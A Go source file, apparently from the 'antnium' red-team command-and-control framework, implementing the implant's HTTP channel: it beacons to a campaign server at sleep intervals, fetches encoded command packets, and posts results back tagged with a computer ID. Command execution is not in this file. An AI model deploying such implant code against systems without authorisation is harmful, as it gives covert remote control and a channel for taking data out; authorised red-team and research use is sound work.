package client

import (
	"bytes"
	"fmt"
	"io/ioutil"
	"net/http"
	"net/url"
	"time"

	"github.com/dobin/antnium/pkg/campaign"
	"github.com/dobin/antnium/pkg/model"
	log "github.com/sirupsen/logrus"
)

type UpstreamHttp struct {
	channel    chan model.Packet
	oobChannel chan model.Packet

	state *ClientState
	coder model.Coder

	config   *ClientConfig
	campaign *campaign.Campaign
}

func MakeUpstreamHttp(config *ClientConfig, campaign *campaign.Campaign) UpstreamHttp {
	coder := model.MakeCoder(campaign)

	clientState := MakeClientState()

	u := UpstreamHttp{
		channel:    make(chan model.Packet),
		oobChannel: make(chan model.Packet),
		state:      &clientState,
		coder:      coder,
		config:     config,
		campaign:   campaign,
	}
	return u
}

func (d *UpstreamHttp) Connect() error {
	proxyUrl, ok := getProxy(d.campaign)
	if ok {
		if proxyUrl, err := url.Parse(proxyUrl); err == nil && proxyUrl.Scheme != "" && proxyUrl.Host != "" {
			proxyUrlFunc := http.ProxyURL(proxyUrl)
			http.DefaultTransport.(*http.Transport).Proxy = proxyUrlFunc
			log.Infof("Using proxy: %s", proxyUrl)
		} else {
			log.Warnf("Could not parse proxy %s: %s", proxyUrl, err.Error())
		}
	}
	return nil
}

func (d *UpstreamHttp) Connected() bool {
	return true
}

func (d *UpstreamHttp) Channel() chan model.Packet {
	return d.channel
}
func (d *UpstreamHttp) OobChannel() chan model.Packet {
	return d.oobChannel
}

// Start is a Thread responsible for receiving packets from server, lifetime:app
func (d *UpstreamHttp) Start() {
	go func() {

		for {
			time.Sleep(d.state.getSleepDuration())

			// Try getting a packet from server
			packet, err := d.GetPacket()
			if err != nil {
				if err == ErrNoPacketsFound {
					fmt.Print(".")
					continue // no packets for us, maybe later
				}

				log.WithFields(log.Fields{
					"error": err,
				}).Debug("Error get packet")

				// Sleep and try again
				continue
			}
			// Notify state that we received a packet
			d.state.gotPacket()

			// Send it to Client
			d.Channel() <- packet

			// Receive answer from Client
			/*packet = <-d.channel // oobChannel?

			log.Infof("BBB UpstreamHttp: 4")

			// Send answer back to server
			err = d.sendPacket(packet)
			if err != nil {
				log.WithFields(log.Fields{
					"packet": packet,
					"error":  err,
				}).Info("Error sending packet")
			}*/
		}

	}()

	go func() {
		for {
			packet := <-d.OobChannel()

			// Send answer to server
			err := d.sendPacket(packet)
			if err != nil {
				log.WithFields(log.Fields{
					"packet": packet,
					"error":  err,
				}).Info("Error sending packet")
			}
		}
	}()
}

func (d *UpstreamHttp) GetPacket() (model.Packet, error) {
	url := d.PacketGetUrl()
	resp, err := d.HttpGet(url)
	if err != nil {
		return model.Packet{}, fmt.Errorf("Error requesting URL %s with error %s", url, err)
	}
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		return model.Packet{}, fmt.Errorf("Error status code %d in requesting URL %s", resp.StatusCode, url)
	}
	bodyBytes, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return model.Packet{}, fmt.Errorf("Error reading body of URL %s with error %s", url, err)
	}

	if len(bodyBytes) <= 0 {
		return model.Packet{}, ErrNoPacketsFound
	}
	packet, err := d.coder.DecodeData(bodyBytes)
	if err != nil {
		return model.Packet{}, fmt.Errorf("Error decoding body of URL %s with error %s", url, err)
	}
	return packet, nil
}

func (d *UpstreamHttp) sendPacket(packet model.Packet) error {
	url := d.PacketSendUrl()

	// Setup response
	packet.ComputerId = d.config.ComputerId

	log.WithFields(log.Fields{
		"1_computerId":   packet.ComputerId,
		"2_packetId":     packet.PacketId,
		"3_downstreamId": packet.DownstreamId,
		"4_packetType":   packet.PacketType,
		"5_arguments":    packet.Arguments,
		"6_response":     "...",
	}).Info("Send")

	data, err := d.coder.EncodeData(packet)
	if err != nil {
		return fmt.Errorf("Could not send answer to URL %s: %s", url, err.Error())
	}

	resp, err := d.HttpPost(url, bytes.NewReader(data))
	if err != nil {
		return fmt.Errorf("Could not send answer to URL %s: %s", url, err.Error())
	}
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("Error status code %d in requesting URL %s", resp.StatusCode, url)
	}

	return nil
}
